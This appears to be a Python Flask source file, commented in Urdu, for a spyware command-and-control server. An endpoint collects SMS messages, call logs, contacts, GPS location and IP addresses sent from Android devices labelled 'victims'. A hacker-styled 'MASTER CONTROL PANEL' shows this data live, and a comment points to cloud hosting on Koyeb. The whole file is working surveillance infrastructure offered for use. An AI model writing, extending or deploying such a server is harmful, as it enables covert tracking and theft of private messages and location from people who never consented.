import os
from flask import Flask, request, jsonify, render_template_string
from datetime import datetime

app = Flask(__name__)

# تمام ڈیٹا کو محفوظ کرنے کے لیے ایک ڈکشنری
# اصل کام میں یہاں ڈیٹا بیس استعمال ہوتا ہے، لیکن ابھی ہم اسے میموری میں رکھ رہے ہیں
victims = {}

# ایڈمن پینل کا خوبصورت ڈیزائن (Hacker Style)
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>MASTER CONTROL PANEL - v6.0</title>
    <style>
        body { background-color: #050505; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
        h1 { text-align: center; border-bottom: 2px solid #00ff41; padding-bottom: 10px; text-shadow: 0 0 10px #00ff41; }
        .container { display: flex; flex-direction: column; gap: 20px; }
        .victim-card { border: 1px solid #00ff41; padding: 20px; background: #0a0a0a; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); position: relative; }
        .victim-header { display: flex; justify-content: space-between; margin-bottom: 15px; background: #003300; padding: 10px; }
        .data-section { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .box { border: 1px solid #333; padding: 10px; height: 250px; overflow-y: auto; background: #000; color: #fff; white-space: pre-wrap; font-size: 0.9em; }
        .label { color: #00ff41; font-weight: bold; margin-bottom: 5px; display: block; text-transform: uppercase; border-bottom: 1px solid #222; }
        .status-online { color: #00ff41; font-weight: bold; animation: blink 1.5s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
        .refresh-tag { position: fixed; bottom: 10px; right: 10px; font-size: 0.7em; color: #555; }
    </style>
    <script>setInterval(() => { location.reload(); }, 15000);</script>
</head>
<body>
    <h1>🛰️ GLOBAL DATA MONITORING SYSTEM</h1>
    <div class="container">
        {% if not victims %}
            <div style="text-align: center; margin-top: 50px; color: #555;">> WAITING FOR INCOMING CONNECTIONS...</div>
        {% endif %}
        
        {% for id, data in victims.items() %}
        <div class="victim-card">
            <div class="victim-header">
                <div><strong>DEVICE:</strong> {{ data.model }} [{{ id }}]</div>
                <div class="status-online">● LIVE BACKGROUND SYNC</div>
            </div>
            
            <p><strong>LAST SYNC:</strong> {{ data.last_sync }} | <strong>IP ADDRESS:</strong> {{ data.ip }}</p>
            
            <div class="data-section">
                <div>
                    <span class="label">📩 SMS & Messages (Latest 20)</span>
                    <div class="box">{{ data.sms_data or 'No SMS data received yet...' }}</div>
                </div>
                <div>
                    <span class="label">📞 Call Logs & Contact Info</span>
                    <div class="box">{{ data.call_data or 'No call log data received yet...' }}</div>
                </div>
            </div>
            
            <div style="margin-top: 15px;">
                <span class="label">📍 Location & Device Metadata</span>
                <div class="box" style="height: 80px;">{{ data.metadata or 'Scanning device info...' }}</div>
            </div>
        </div>
        {% endfor %}
    </div>
    <div class="refresh-tag">System auto-refreshes every 15s</div>
</body>
</html>
"""

@app.route('/app_sync', methods=['POST'])
def receive_data():
    try:
        json_payload = request.json
        if not json_payload:
            return jsonify({"status": "error", "message": "Payload is empty"}), 400
        
        # ڈیوائس آئی ڈی کو منفرد کلید کے طور پر استعمال کریں
        device_id = json_payload.get('device_id', 'UNKNOWN_DEVICE')
        
        # ڈیٹا کو اپ ڈیٹ کریں یا نیا شامل کریں
        victims[device_id] = {
            "model": json_payload.get('model', 'Unknown Android'),
            "sms_data": json_payload.get('sms_data', ''),
            "call_data": json_payload.get('call_data', ''),
            "metadata": f"Lat: {json_payload.get('lat', 'N/A')}, Lon: {json_payload.get('lon', 'N/A')}\nDevice ID: {device_id}",
            "last_sync": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "ip": request.remote_addr
        }
        
        print(f"[*] Data synchronized for device: {device_id}")
        return jsonify({"status": "success", "sync": True}), 200

    except Exception as e:
        print(f"[!] Error processing sync: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def dashboard():
    return render_template_string(ADMIN_HTML, victims=victims)

if __name__ == '__main__':
    # Koyeb پورٹ سیٹ اپ
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
